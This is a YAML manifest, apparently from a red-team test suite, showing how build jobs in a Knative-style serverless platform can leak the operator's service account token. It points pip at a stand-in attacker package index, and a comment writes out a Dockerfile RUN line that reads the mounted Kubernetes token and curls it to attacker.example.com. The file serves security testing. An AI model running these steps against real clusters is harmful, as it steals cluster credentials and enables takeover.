# BLUE-006: SA Token Exposure in Build Jobs
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit demonstrates how a malicious Dockerfile or build script
# can access the operator's service account token mounted in build pods.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-006-build-token-theft
  labels:
    redteam: "true"
    exploit: "blue-006"
    target: "build-token"
  annotations:
    redteam.knative.io/description: "Steal SA token from build pod"
spec:
  source:
    type: inline
    inline:
      # The code itself looks innocent, but the build process is exploited
      # via a malicious Dockerfile that would be generated
      code: |
        def handler(event):
            return {"status": "innocent_function"}
      # Dependencies with malicious postinstall
      dependencies: |
        # requirements.txt that triggers code during pip install
        # This runs in the build container which has the SA token
        --extra-index-url http://attacker.example.com/simple/
        malicious-package==1.0.0
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
# Alternative: Use git source with malicious Dockerfile instructions
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-006-dockerfile-exfil
  labels:
    redteam: "true"
    exploit: "blue-006"
    target: "dockerfile-exfil"
  annotations:
    redteam.knative.io/description: "Dockerfile RUN command to exfil token"
spec:
  source:
    type: git
    git:
      # Repository containing a Dockerfile with malicious RUN commands
      # The Dockerfile would contain:
      # RUN cat /var/run/secrets/kubernetes.io/serviceaccount/token | \
      #     curl -X POST -d @- http://attacker.example.com/build-token
      url: "https://github.com/attacker/malicious-lambda-repo"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
